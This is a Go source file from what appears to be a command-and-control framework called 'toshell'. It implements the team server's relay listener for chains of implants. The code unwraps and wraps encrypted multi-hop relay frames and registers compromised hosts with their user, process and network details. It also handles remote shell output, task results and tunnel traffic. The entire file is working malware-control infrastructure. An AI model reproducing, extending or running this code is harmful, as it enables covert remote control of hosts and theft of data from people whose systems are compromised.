package listener

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"time"

	"toshell/internal/common/crypto"
	"toshell/internal/common/protocol"
	"toshell/internal/common/tunnel"
	"toshell/internal/common/types"
)

// ─── 链式回连（Beacon Mesh，支持多跳 + 隧道转发）───
//
// 拓扑：叶子 -> 中继 -> ... -> 中继 -> 团队服务器（树形，每个节点至多一个父节点）。
// 叶子植入体的 server_addr 指向其父中继的 relay_listen 地址；中继植入体同时以自身
// 会话直连（或经上级中继连接）团队服务器，并监听子植入体连接，将子帧包装成
// TypeRelay 帧经自身 C2 连接转发。控制帧与隧道 raw 帧均支持经中继链转发。
//
// 帧格式（TypeRelay 负载）：[4B routeID（父中继为每个子连接分配的编号）][子帧]
// 子帧 = [4B len][1B type][data]（control=0x00 AES-GCM / raw=0x01 SM4-GCM）

const maxRelayHops = 16

type relayRoute struct {
	relaySessionID string
	routeID        uint32
}

func relayKey(rt relayRoute) string {
	return fmt.Sprintf("%s:%d", rt.relaySessionID, rt.routeID)
}

// setChildRoute 记录子会话的中继路由（子会话首次注册时调用）。
func (l *TCPListener) setChildRoute(childSessionID string, rt relayRoute) {
	l.relayMu.Lock()
	defer l.relayMu.Unlock()
	l.childRelay[childSessionID] = rt
	l.relayToChild[relayKey(rt)] = childSessionID
}

// lookupChildRoute 查询子会话的中继路由。
func (l *TCPListener) lookupChildRoute(childSessionID string) (relayRoute, bool) {
	l.relayMu.RLock()
	defer l.relayMu.RUnlock()
	rt, ok := l.childRelay[childSessionID]
	return rt, ok
}

// lookupChildByRelay 按中继会话 + routeID 反查子会话。
func (l *TCPListener) lookupChildByRelay(relaySessionID string, routeID uint32) string {
	l.relayMu.RLock()
	defer l.relayMu.RUnlock()
	return l.relayToChild[relayKey(relayRoute{relaySessionID, routeID})]
}

// ─── 上行：递归解包 ──────────────────────────────────────────────────────────────

// handleRelay 处理中继节点转发的子会话帧（顶层入口）。
func (l *TCPListener) handleRelay(conn net.Conn, packet *protocol.Packet) {
	relaySessionID := fmt.Sprintf("%x", packet.ID)
	l.unwrapRelayPayload(relaySessionID, packet.Payload, 0)
}

// handleRelayStatus 处理中继节点上报的监听状态（{addr}，空=已停止）。
func (l *TCPListener) handleRelayStatus(conn net.Conn, packet *protocol.Packet) {
	sessionID := fmt.Sprintf("%x", packet.ID)
	var req struct {
		Addr string `json:"addr"`
	}
	if err := json.Unmarshal(packet.Payload, &req); err != nil {
		return
	}
	l.relayMu.Lock()
	if req.Addr == "" {
		delete(l.relayNodes, sessionID)
	} else {
		l.relayNodes[sessionID] = req.Addr
	}
	l.relayMu.Unlock()
}

// ListRelayNodes 返回当前正在监听的中继节点列表（供前端选择作为服务器地址）。
func (l *TCPListener) ListRelayNodes() []types.RelayNode {
	l.relayMu.RLock()
	defer l.relayMu.RUnlock()
	out := make([]types.RelayNode, 0, len(l.relayNodes))
	for sid, addr := range l.relayNodes {
		node := types.RelayNode{SessionID: sid, Addr: addr}
		if sess, err := l.sessionMgr.Get(sid); err == nil && sess != nil && sess.Info != nil {
			info := sess.Info
			if info.Hostname != "" {
				node.Hostname = info.Hostname
			} else {
				node.Hostname = sid
			}
			// 可达 IP：优先 RemoteAddr 的 IP 部分，其次本地 IP，最后主机名
			if h, _, err := net.SplitHostPort(info.RemoteAddr); err == nil && h != "" {
				node.Host = h
			} else if len(info.IPAddresses) > 0 {
				node.Host = info.IPAddresses[0]
			} else {
				node.Host = node.Hostname
			}
		}
		if _, p, err := net.SplitHostPort(addr); err == nil {
			node.Port = p
		}
		out = append(out, node)
	}
	return out
}

// unwrapRelayPayload 递归解包 TypeRelay 负载（多跳：中间节点帧亦是 TypeRelay）。
func (l *TCPListener) unwrapRelayPayload(relaySessionID string, payload []byte, depth int) {
	if depth >= maxRelayHops {
		return
	}
	if len(payload) < 4+5 {
		return
	}
	routeID := binary.BigEndian.Uint32(payload[:4])
	childFrame := payload[4:]
	if len(childFrame) < 5 {
		return
	}
	childLen := binary.BigEndian.Uint32(childFrame[:4])
	frameType := childFrame[4]
	data := childFrame[5:]
	if uint64(childLen) > uint64(len(data)) {
		return
	}
	data = data[:childLen]
	l.processRelayedFrame(relaySessionID, routeID, frameType, data, depth+1)
}

// processRelayedFrame 处理解包出的一层帧。
func (l *TCPListener) processRelayedFrame(relaySessionID string, routeID uint32, frameType byte, data []byte, depth int) {
	if frameType == frameTypeControl {
		pkt, err := l.parsePacketFromData(data)
		if err != nil || pkt == nil {
			return
		}
		innerID := fmt.Sprintf("%x", pkt.ID)

		if pkt.Type == protocol.TypeRelay {
			// 中间中继节点帧：记录该中继的路由后继续递归解包
			if innerID != "0" {
				l.setChildRoute(innerID, relayRoute{relaySessionID, routeID})
			}
			l.unwrapRelayPayload(innerID, pkt.Payload, depth)
			return
		}

		// 叶子控制帧（register/heartbeat/result/shell...）
		if innerID != "0" {
			l.setChildRoute(innerID, relayRoute{relaySessionID, routeID})
		}
		l.dispatchRelayedPacket(innerID, relaySessionID, pkt, depth)
		return
	}

	if frameType == frameTypeRaw {
		// 隧道 raw 帧：按已记录的路由反查子会话
		childSessionID := l.lookupChildByRelay(relaySessionID, routeID)
		if childSessionID == "" {
			return
		}
		data = l.decryptTunnel(data)
		if len(data) == 0 {
			return
		}
		sess, err := l.sessionMgr.Get(childSessionID)
		if err != nil || sess == nil {
			return
		}
		sess.LastSeen = time.Now()
		sess.Info.LastSeen = time.Now()
		tp, err := tunnel.DecodeTunnelPacket(data)
		if err == nil && tp != nil {
			sess.DispatchTunnelData(tp)
		}
	}
}

// ─── 下行：递归包装 ──────────────────────────────────────────────────────────────

// sendOrQueue 发送控制帧：目标经中继链则递归包装，直连则直接写入。
func (l *TCPListener) sendOrQueue(sessionID string, packet *protocol.Packet, wait bool, depth int) error {
	if depth >= maxRelayHops {
		return fmt.Errorf("relay chain too deep for session %s", sessionID)
	}
	if rt, ok := l.lookupChildRoute(sessionID); ok {
		innerFrame, err := l.encodeControlFrame(packet)
		if err != nil {
			return err
		}
		return l.wrapAndSend(rt, innerFrame, depth+1)
	}
	return l.queuePacketDirect(sessionID, packet, wait)
}

// sendRawOrDirect 发送隧道 raw 帧：目标经中继链则递归包装，直连则走 writeRaw。
func (l *TCPListener) sendRawOrDirect(sessionID string, rawPacket []byte, depth int) error {
	if depth >= maxRelayHops {
		return fmt.Errorf("relay chain too deep for session %s", sessionID)
	}
	if rt, ok := l.lookupChildRoute(sessionID); ok {
		rawFrame, err := l.encodeRawFrame(rawPacket)
		if err != nil {
			return err
		}
		return l.wrapAndSend(rt, rawFrame, depth+1)
	}
	sw, ok := l.getWriter(sessionID)
	if !ok {
		return fmt.Errorf("no writer for session %s", sessionID)
	}
	if err := sw.writeRaw(rawPacket); err != nil {
		if tcpConn, ok := sw.conn.(*net.TCPConn); ok {
			tcpConn.Close()
		}
		return err
	}
	return nil
}

// wrapAndSend 将 innerFrame 包装成 TypeRelay 帧并递归发往中继。
func (l *TCPListener) wrapAndSend(rt relayRoute, innerFrame []byte, depth int) error {
	payload := make([]byte, 4+len(innerFrame))
	binary.BigEndian.PutUint32(payload[:4], rt.routeID)
	copy(payload[4:], innerFrame)

	relayPacket := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeRelay,
		ID:        0,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   payload,
	}
	// 递归：中继可能也在链后
	return l.sendOrQueue(rt.relaySessionID, relayPacket, true, depth)
}

// encodeControlFrame 将控制 packet 编码为 C2 控制帧字节（[4B len][1B control][AES-GCM]）。
func (l *TCPListener) encodeControlFrame(packet *protocol.Packet) ([]byte, error) {
	data := encodePacket(packet)
	compressed, err := compress(data)
	if err != nil {
		return nil, err
	}
	encrypted, err := l.encryptor.Encrypt(compressed)
	if err != nil {
		return nil, err
	}
	buf := make([]byte, 5+len(encrypted))
	binary.BigEndian.PutUint32(buf[:4], uint32(len(encrypted)))
	buf[4] = frameTypeControl
	copy(buf[5:], encrypted)
	return buf, nil
}

// encodeRawFrame 将隧道 raw 消息编码为 raw 帧字节（[4B len][1B raw][SM4-GCM]）。
func (l *TCPListener) encodeRawFrame(rawPacket []byte) ([]byte, error) {
	enc, err := l.encryptTunnelRaw(rawPacket)
	if err != nil {
		return nil, err
	}
	buf := make([]byte, 5+len(enc))
	binary.BigEndian.PutUint32(buf[:4], uint32(len(enc)))
	buf[4] = frameTypeRaw
	copy(buf[5:], enc)
	return buf, nil
}

// encryptTunnelRaw 对隧道 raw 消息做 SM4-GCM 加密（与 writeRaw 一致）。
func (l *TCPListener) encryptTunnelRaw(rawPacket []byte) ([]byte, error) {
	return crypto.SM4EncryptTunnel(rawPacket, l.sm4Key)
}

// ─── 中继子会话控制帧分派 ────────────────────────────────────────────────────────

// dispatchRelayedPacket 分派中继子会话的控制帧（relaySessionID 为父中继会话，depth 为跳数）。
func (l *TCPListener) dispatchRelayedPacket(childSessionID, relaySessionID string, pkt *protocol.Packet, depth int) {
	switch pkt.Type {
	case protocol.TypeRegister:
		l.handleRegisterRelayed(childSessionID, relaySessionID, pkt, depth)
	case protocol.TypeHeartbeat:
		l.handleHeartbeatRelayed(childSessionID, pkt)
	case protocol.TypeResult:
		l.handleResultRelayed(childSessionID, pkt)
	case protocol.TypeShellData:
		l.handleShellDataRelayed(childSessionID, pkt)
	case protocol.TypeFileDown:
		l.handleFileDownRelayed(childSessionID, pkt)
	}
}

// handleRegisterRelayed 处理中继子会话的注册（首次上线时建立会话）。
func (l *TCPListener) handleRegisterRelayed(childSessionID, relaySessionID string, pkt *protocol.Packet, depth int) {
	var reg protocol.Register
	if err := json.Unmarshal(pkt.Payload, &reg); err != nil {
		return
	}
	// 中继跳数：1 跳记为 "relay"，多跳记为 "relay2"/"relay3"...，供前端区分二级/多级叶子
	listener := "relay"
	if depth > 1 {
		listener = fmt.Sprintf("relay%d", depth)
	}
	// 父中继主机名（用于链路展示）
	parentRelay := ""
	if ps, err := l.sessionMgr.Get(relaySessionID); err == nil && ps != nil && ps.Info != nil {
		parentRelay = ps.Info.Hostname
	}
	sess := &types.SessionInfo{
		ID:           childSessionID,
		Hostname:     reg.Hostname,
		Username:     reg.Username,
		OS:           reg.OS,
		Arch:         reg.Arch,
		PID:          reg.PID,
		ProcessName:  reg.ProcessName,
		ProcessPath:  reg.ProcessPath,
		IPAddresses:  reg.IPAddresses,
		MACAddresses: reg.MACAddresses,
		Domain:       reg.Domain,
		RemoteAddr:   "relay",
		ParentRelay:  parentRelay,
		FirstSeen:    time.Now(),
		LastSeen:     time.Now(),
		Status:       "active",
		Listener:     listener,
	}
	if err := l.sessionMgr.Add(sess); err != nil {
		_ = l.sessionMgr.RefreshInfo(childSessionID, sess)
	} else if l.onSessionOnline != nil {
		l.onSessionOnline(sess)
	}

	ack := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeAck,
		ID:        pkt.ID,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   []byte(`{"status":"registered"}`),
	}
	_ = l.queuePacket(childSessionID, ack, false)
}

// handleHeartbeatRelayed 处理中继子会话心跳。
func (l *TCPListener) handleHeartbeatRelayed(childSessionID string, pkt *protocol.Packet) {
	if sess, err := l.sessionMgr.Get(childSessionID); err == nil && sess != nil {
		sess.LastSeen = time.Now()
		sess.Info.LastSeen = time.Now()
	}
	ack := &protocol.Packet{
		Magic:     [4]byte{'T', 'S', 'H', 'L'},
		Version:   protocol.Version,
		Type:      protocol.TypeAck,
		ID:        pkt.ID,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   []byte(`{"status":"ok"}`),
	}
	_ = l.queuePacket(childSessionID, ack, false)
}

// handleResultRelayed 处理中继子会话的任务结果。
func (l *TCPListener) handleResultRelayed(childSessionID string, pkt *protocol.Packet) {
	var result protocol.Result
	if err := json.Unmarshal(pkt.Payload, &result); err != nil {
		return
	}
	if sess, err := l.sessionMgr.Get(childSessionID); err == nil && sess != nil {
		sess.LastSeen = time.Now()
		sess.Info.LastSeen = time.Now()
	}
	if l.taskMgr != nil {
		if result.ExitCode == 0 && result.Error == "" {
			_ = l.taskMgr.Complete(result.TaskID, result.ExitCode, result.Output, result.Error)
		} else {
			errMsg := result.Error
			if errMsg == "" && result.ExitCode != 0 {
				errMsg = fmt.Sprintf("exit code %d", result.ExitCode)
			}
			_ = l.taskMgr.Fail(result.TaskID, errMsg)
		}
	}
	if l.onTaskResult != nil {
		taskType := result.TaskType
		eventType := "task_completed"
		if result.Error != "" || result.ExitCode != 0 {
			eventType = "task_failed"
		}
		l.onTaskResult(eventType, result.TaskID, childSessionID, taskType, result.ExitCode, result.Output, result.Error)
	}
}

// handleShellDataRelayed 处理中继子会话的 Shell 数据。
func (l *TCPListener) handleShellDataRelayed(childSessionID string, pkt *protocol.Packet) {
	var data struct {
		Data string `json:"data"`
		CWD  string `json:"cwd"`
	}
	if err := json.Unmarshal(pkt.Payload, &data); err != nil {
		return
	}
	sess, err := l.sessionMgr.Get(childSessionID)
	if err != nil || sess == nil {
		return
	}
	sess.LastSeen = time.Now()
	sess.Info.LastSeen = time.Now()
	if data.CWD != "" {
		sess.SetShellCWD(data.CWD)
	}
	sess.DispatchShellOutput([]byte(data.Data))
}

// handleFileDownRelayed 处理中继子会话的文件分块（v1 忽略，避免大文件直传撑爆中继）。
func (l *TCPListener) handleFileDownRelayed(childSessionID string, pkt *protocol.Packet) {
}
